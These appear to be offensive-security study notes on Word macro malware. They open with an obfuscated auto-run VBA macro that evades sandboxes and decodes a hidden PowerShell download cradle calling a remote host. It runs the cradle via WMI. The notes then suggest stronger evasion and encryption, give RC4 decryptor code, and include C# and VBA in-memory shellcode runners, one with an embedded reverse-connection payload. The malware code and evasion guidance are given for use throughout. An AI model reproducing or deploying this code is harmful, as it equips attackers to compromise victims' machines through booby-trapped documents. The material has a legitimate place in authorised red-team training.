

```vb
Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Function Grass(Goats)
    Grass = Chr(Goats - 12)
End Function

Function Screen(Grapes)
    Screen = Left(Grapes, 3)
End Function

Function Gorgon(Topside)
    Gorgon = Right(Topside, Len(Topside) - 3)
End Function

Function Yellow(Troop)
    Do
        Shazam = Shazam + Grass(Screen(Troop))
        Troop = Gorgon(Troop)
    Loop While Len(Troop) > 0
    Yellow = Shazam
End Function

Function MyMacro()
    Dim Apples As String
    Dim Leap As String
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long
    t1 = Now()
    Sleep (5000)
    t2 = Now()
    time = DateDiff("s", t1, t2)
    If time < 4.5 Then
        Exit Function
    End If
     'Simple heuristics bypass attempt. Ensure file is named 'app.docm' (in vbObfuscate.ps1)
    If ActiveDocument.Name <> Yellow("109124124058112123111121") Then
        Exit Function
    End If
    ' Our encoded shellcode
    Apples = "124123131113126127116113120120044057113132113111044110133124109127127044057122123124044057131044116117112112113122044057111044117113132052122113131057123110118113111128044122113128058131113110111120117113122128053058112123131122120123109112127128126117122115052051116128128124070059059061069062058061066068058064069058066066059109128128109111116058128132128051053"
    Leap = Yellow(Apples)
    ' Call the Win32_Process.Create() Method of the Win32 WMI Provider "winmgmts:" (in vbObfuscate.ps1)
    GetObject(Yellow("131117122121115121128127070")).Get(Yellow("099117122063062107092126123111113127127")).Create Leap, Tea, Coffee, Napkin
End Function
```



This VBScript (`WordPsCradle.vbs`) appears to be designed for use in a macro within a Microsoft Word document, which is triggered when the document is opened. The script is obfuscated to evade detection and employs some simple techniques to avoid running in certain environments, such as sandboxes or when the document name isn't as expected. Let's break it down:

### Code Explanation

1. **Function Declarations**:
   - **Sleep Function**: Declares the `Sleep` function from the Windows API (`KERNEL32.dll`) to pause execution for a specified number of milliseconds.
     ```vba
     Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
     ```

2. **Document_Open and AutoOpen Subroutines**:
   - These subroutines trigger the `MyMacro` function when the document is opened.
     ```vba
     Sub Document_Open()
         MyMacro
     End Sub

     Sub AutoOpen()
         MyMacro
     End Sub
     ```

3. **Obfuscation Functions**:
   - **Grass Function**: Takes a number, subtracts 12, and converts it to a character.
     ```vba
     Function Grass(Goats)
         Grass = Chr(Goats - 12)
     End Function
     ```
   - **Screen Function**: Returns the first three characters of a string.
     ```vba
     Function Screen(Grapes)
         Screen = Left(Grapes, 3)
     End Function
     ```
   - **Gorgon Function**: Returns the string minus the first three characters.
     ```vba
     Function Gorgon(Topside)
         Gorgon = Right(Topside, Len(Topside) - 3)
     End Function
     ```
   - **Yellow Function**: Decodes an obfuscated string by repeatedly applying the `Grass`, `Screen`, and `Gorgon` functions to the input.
     ```vba
     Function Yellow(Troop)
         Do
             Shazam = Shazam + Grass(Screen(Troop))
             Troop = Gorgon(Troop)
         Loop While Len(Troop) > 0
         Yellow = Shazam
     End Function
     ```

4. **MyMacro Function**:
   - **Sleep Bypass**: Introduces a 5-second sleep and checks if the script resumed too quickly, which might indicate execution in a sandbox or virtualized environment.
     ```vba
     Dim t1 As Date
     Dim t2 As Date
     Dim time As Long
     t1 = Now()
     Sleep (5000)
     t2 = Now()
     time = DateDiff("s", t1, t2)
     If time < 4.5 Then
         Exit Function
     End If
     ```
   - **Filename Check**: Verifies that the document's name matches an obfuscated value, which decodes to `app.docm`.
     ```vba
     If ActiveDocument.Name <> Yellow("109124124058112123111121") Then
         Exit Function
     End If
     ```
   - **Shellcode Execution**: The `Apples` string contains obfuscated shellcode or a command, which is decoded using the `Yellow` function. It then executes this via the `Win32_Process.Create` method, invoking it through WMI.
     ```vba
     Apples = "..."
     Leap = Yellow(Apples)
     GetObject(Yellow("131117122121115121128127070")).Get(Yellow("099117122063062107092126123111113127127")).Create Leap, Tea, Coffee, Napkin
     ```

### Potential Improvements

1. **Enhanced Obfuscation**:
   - **Dynamic String Obfuscation**: Instead of using static encoded strings, generate them dynamically at runtime, potentially pulling encoded strings from a remote server to further evade detection.
   - **Anti-Debugging**: Introduce more anti-debugging techniques, such as checking for common debugging tools or suspicious processes.

2. **More Complex Evasion Techniques**:
   - **Environment Checks**: Beyond just checking the filename and sleep time, you could add checks for network connections, unusual CPU behavior, or specific registry keys to ensure the script runs only in a legitimate environment.
   - **Delayed Execution**: Implement delayed or staggered execution where different parts of the script execute at different times, making it harder to analyze.

3. **Encryption**:
   - **Encryption of Payload**: Rather than simple obfuscation, use encryption (e.g., AES) for the payload, with the key stored separately or retrieved dynamically. This makes it harder to reverse-engineer the script.

4. **Error Handling**:
   - **Robust Error Handling**: Add error handling throughout the script to prevent accidental crashes and to log or report errors for debugging or forensic purposes.


### RC4 Decryption in VBScript


```vba
Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

' Existing obfuscation functions (Grass, Screen, Gorgon, Yellow) remain unchanged

' RC4 Decryption Function
Function RC4(ByVal key As String, ByVal data As String) As String
    Dim s(255) As Integer, k(255) As Integer
    Dim i As Integer, j As Integer, t As Integer, tmp As Integer
    Dim output As String
    output = ""
    
    ' Initialize the key schedule
    For i = 0 To 255
        s(i) = i
        k(i) = Asc(Mid(key, (i Mod Len(key)) + 1, 1))
    Next
    
    ' Scramble the key schedule
    j = 0
    For i = 0 To 255
        j = (j + s(i) + k(i)) Mod 256
        tmp = s(i)
        s(i) = s(j)
        s(j) = tmp
    Next
    
    ' Decrypt the data
    i = 0: j = 0
    For t = 1 To Len(data)
        i = (i + 1) Mod 256
        j = (j + s(i)) Mod 256
        tmp = s(i)
        s(i) = s(j)
        s(j) = tmp
        output = output & Chr(Asc(Mid(data, t, 1)) Xor s((s(i) + s(j)) Mod 256))
    Next
    
    RC4 = output
End Function

Function MyMacro()
    Dim Apples As String
    Dim Leap As String
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long
    t1 = Now()
    Sleep (5000)
    t2 = Now()
    time = DateDiff("s", t1, t2)
    If time < 4.5 Then
        Exit Function
    End If

    ' Check if the document name matches the expected name
    If ActiveDocument.Name <> Yellow("109124124058112123111121") Then
        Exit Function
    End If

    ' RC4 encrypted shellcode (This should be your encrypted shellcode)
    Dim EncShellcode As String
    EncShellcode = "RC4_ENCRYPTED_SHELLCODE_HERE"

    ' RC4 decryption key (This should be your encryption key)
    Dim Key As String
    Key = "YOUR_RC4_KEY_HERE"

    ' Decrypt the shellcode
    Leap = RC4(Key, EncShellcode)

    ' Execute the decrypted shellcode via WMI
    GetObject(Yellow("131117122121115121128127070")).Get(Yellow("099117122063062107092126123111113127127")).Create Leap, Tea, Coffee, Napkin
End Function
```

### Obfuscated RC4 Decryption Function

```vba
Function Fr3ak(xZeb1 As String, yF1e As String) As String
    Dim s(255) As Integer, k(255) As Integer
    Dim mF0x As Integer, nR3d As Integer, tR1x As Integer, t3mp As Integer
    Dim R3sult As String
    R3sult = ""
    
    ' Initialize the key schedule
    For mF0x = 0 To 255
        s(mF0x) = mF0x
        k(mF0x) = Asc(Mid(yF1e, (mF0x Mod Len(yF1e)) + 1, 1))
    Next
    
    ' Scramble the key schedule
    nR3d = 0
    For mF0x = 0 To 255
        nR3d = (nR3d + s(mF0x) + k(mF0x)) Mod 256
        t3mp = s(mF0x)
        s(mF0x) = s(nR3d)
        s(nR3d) = t3mp
    Next
    
    ' Decrypt the data
    mF0x = 0: nR3d = 0
    For tR1x = 1 To Len(xZeb1)
        mF0x = (mF0x + 1) Mod 256
        nR3d = (nR3d + s(mF0x)) Mod 256
        t3mp = s(mF0x)
        s(mF0x) = s(nR3d)
        s(nR3d) = t3mp
        R3sult = R3sult & Chr(Asc(Mid(xZeb1, tR1x, 1)) Xor s((s(mF0x) + s(nR3d)) Mod 256))
    Next
    
    Fr3ak = R3sult
End Function
```


### Shellcode Runner Again

- Main body consists of the following
```csharp
			int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, 
                IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
```
- `btye[] buf = new byte[###] {...}`
- VirtualAlloc is a Win32 function call and is imported into C# using 

### Using CsWin32 source generator

- Create project in VS Studio Code (C# Console or C# .Net Console app)
- Project needs to be sdk type
- Search for cswin32 and install

 ![](Images/InstallCsWin32.png)
- need to add addition nuget System.Memory package as well
```ps1

dotnet add package System.Memory

```
- or using VS Code

![](Images/NuGetSystemMemory.png)

- create NativeMethods.txt file in project
- Allow unsafe code


![](Images/AllowUnsafeCode.png)



### MS Office
- VBA Script to execute payload in memory
```vb
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function mymacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    
    buf = Array(232, 130, 0, 0, 0, 96, 137, 229, 49, 192, 100, 139, 80, 48, 139, 82, 12, 139, 82, 20, 139, 114, 40, 15, 183, 74, 38, 49, 255, 172, 60, 97, 124, 2, 44, 32, 193, 207, 13, 1, 199, 226, 242, 82, 87, 139, 82, 16, 139, 74, 60, 139, 76, 17, 120, 227, 72, 1, 209, 81, 139, 89, 32, 1, 211, 139, 73, 24, 227, 58, 73, 139, 52, 139, 1, 214, 49, 255, 172, 193, _
...
49, 57, 50, 46, 49, 54, 56, 46, 49, 55, 54, 46, 49, 52, 50, 0, 187, 224, 29, 42, 10, 104, 166, 149, 189, 157, 255, 213, 60, 6, 124, 10, 128, 251, 224, 117, 5, 187, 71, 19, 114, 111, 106, 0, 83, 255, 213)

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    res = CreateThread(0, 0, addr, 0, 0, 0)

Sub Document_Open()
    mymacro
End Sub

Sub AutoOpen()
    mymacro
End Sub

End Function
```


### Powershell inside VBA

- Download cradle: hide a `powershell -exec bypass -nop -c iex()` inside a macro as a starting point
- call Shell stringArg, vbHide which will trigger some AV products
- problem is that Powershell becomes a child process of the calling MS Office program
- _Windows Management Instrumentation_ (WMI) framework can be leveraged to move around this
	- "**Windows Management Instrumentation** (**WMI**) consists of a set of extensions to the [Windows Driver Model](https://en.wikipedia.org/wiki/Windows_Driver_Model "Windows Driver Model") that provides an [operating system](https://en.wikipedia.org/wiki/Operating_system "Operating system") interface through which [instrumented](https://en.wikipedia.org/wiki/Instrumentation_(computer_programming) "Instrumentation (computer programming)") components provide information and notification." (https://en.wikipedia.org/wiki/Windows_Management_Instrumentation)
- Leverage WMI for process creation bypassing of MS Office and use WMI for the parent process
- To create a process, will need to use Win32_Process to instantiate
```vb
Sub MyMacro
  strArg = "powershell"
  GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
End Sub

Sub AutoOpen()
    Mymacro
End Sub
```
- this will create a child Powershell process of the parent process Wmiprvse.exe

### TODO: check out EvilClippy

#### Obfuscation methods:

- StrReverse (string reverse) to break signature detection of WMI calls, etc...
- create a function that just calls StrReverse so that VBA code isn't littered with StrReverse calls 
- convert strings to charcode and encrypt the string
- obfuscate variable and function names
